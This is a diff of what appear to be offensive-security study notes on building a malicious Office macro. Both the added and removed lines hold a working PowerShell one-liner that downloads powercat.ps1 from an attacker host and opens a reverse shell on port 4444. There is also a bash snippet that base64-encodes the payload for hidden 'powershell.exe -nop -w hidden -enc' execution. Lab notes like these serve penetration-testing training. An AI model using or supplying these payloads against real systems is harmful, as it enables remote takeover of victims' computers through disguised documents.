@@ -109,16 +109,14 @@ If we want to have a macro with a more sophisticated payload that:
 We can define the initial payload like this:
 
 ```
-IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
+IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.157/powercat.ps1');powercat -c 192.168.45.157 -p 4444 -e powershell
 ```
 
-Then, use the following Python script to split the base64-encoded string into smaller chunks of 50 characters and concatenate them into the _Str_ variable.
+Then, use the following Python script to split the base64-encoded string into smaller chunks of 50 characters and concatenate them into the _Str_ variable. 
 
 ```bash
 bash << 'EOF'
-payload=$(echo -n "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.201/powercat.ps1');powercat -c 192.168.45.201 -p 4444 -e powershell" \
-| iconv -t UTF-16LE \
-| base64 -w 0)
+payload=$(echo -n "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.157/powercat.ps1');.\powercat.ps1 -c 192.168.45.157 -p 4444 -e powershell" | iconv -t UTF-16LE | base64 -w 0)
 
 str="powershell.exe -nop -w hidden -enc $payload"
 
@@ -135,7 +133,7 @@ Same thing in python would be:
 
 ```
 # conver the payload
-IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
+IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.157/powercat.ps1');powercat -c 192.168.45.157 -p 4444 -e powershell
 # to base64
 
 
